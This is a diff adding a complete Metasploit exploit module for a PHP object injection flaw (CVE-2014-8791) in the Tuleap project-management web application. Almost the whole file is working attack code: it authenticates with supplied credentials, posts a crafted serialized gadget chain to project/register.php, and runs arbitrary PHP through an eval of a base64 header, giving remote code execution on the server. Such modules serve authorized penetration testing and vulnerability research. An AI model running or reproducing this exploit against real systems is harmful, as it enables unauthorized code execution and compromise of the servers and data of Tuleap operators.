@@ -1,0 +1,102 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Tuleap PHP Unserialize Code Execution',
+      'Description'    => %q{
+        This module exploits a PHP object injection vulnerability in Tuelap <= 7.6-4 which could be
+        abused to allow authenticated users to execute arbitrary code with the permissions of the
+        web server. The dangerous unserialize() call exists in the 'src/www/project/register.php'
+        file. The exploit abuses the destructor method from the Jabbex class in order to reach a
+        call_user_func_array() call in the Jabber class and call the fetchPostActions() method from
+        the Transition_PostAction_FieldFactory class to execute PHP code through an eval() call. In
+        order to work, the target must have the 'sys_create_project_in_one_step' option disabled.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         => 'EgiX',
+      'References'     =>
+        [
+          ['CVE', '2014-8791'],
+          ['OSVDB', '115128'],
+          ['URL', 'http://karmainsecurity.com/KIS-2014-13'],
+          ['URL', 'https://tuleap.net/plugins/tracker/?aid=7601']
+        ],
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [['Generic (PHP Payload)', {}]],
+      'DisclosureDate' => 'Nov 27 2014',
+      'DefaultTarget'  => 0))
+
+      register_options(
+      [
+        OptString.new('TARGETURI', [true, "The base path to the web application", "/"]),
+        OptString.new('USERNAME', [true, "The username to authenticate with" ]),
+        OptString.new('PASSWORD', [true, "The password to authenticate with" ]),
+        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", true]),
+        Opt::RPORT(443)
+      ], self.class)
+  end
+
+  def check
+    flag = rand_text_alpha(rand(10)+20)
+    res = exec_php("print #{flag};")
+
+    if res and res.body and res.body.to_s =~ /#{flag}/
+      return Exploit::CheckCode::Vulnerable
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def do_login()
+    print_status("#{peer} - Logging in...")
+
+    username = datastore['USERNAME']
+    password = datastore['PASSWORD']
+
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, 'account/login.php'),
+      'vars_post' => {'form_loginname' => username, 'form_pw' => password}
+    })
+
+    unless res && res.code == 302
+      fail_with(Failure::NoAccess, "#{peer} - Login failed with #{username}:#{password}")
+    end
+
+    print_status("#{peer} - Login successful with #{username}:#{password}")
+    res.get_cookies
+  end
+
+  def exec_php(php_code)
+    session_cookies = do_login()
+
+    chain =  'O:6:"Jabbex":2:{S:15:"\00Jabbex\00handler";O:12:"EventHandler":1:{S:27:"\00EventHandler\00authenticated";b:1;}'
+    chain << 'S:11:"\00Jabbex\00jab";O:6:"Jabber":3:{S:8:"_use_log";i:1;S:11:"_connection";O:5:"Chart":0:{}S:15:"_event_handlers";'
+    chain << 'a:1:{S:9:"debug_log";a:2:{i:0;O:34:"Transition_PostAction_FieldFactory":1:{S:23:"\00*\00post_actions_classes";'
+    chain << 'a:1:{i:0;S:52:"1;eval(base64_decode($_SERVER[HTTP_PAYLOAD]));die;//";}}i:1;S:16:"fetchPostActions";}}}}'
+
+    send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, 'project/register.php'),
+      'cookie'    => session_cookies,
+      'vars_post' => {'data' => chain},
+      'headers'   => {'payload' => Rex::Text.encode_base64(php_code)}
+    }, 3)
+  end
+
+  def exploit
+    print_status("#{peer} - Exploiting the PHP object injection...")
+    exec_php(payload.encoded)
+  end
+end
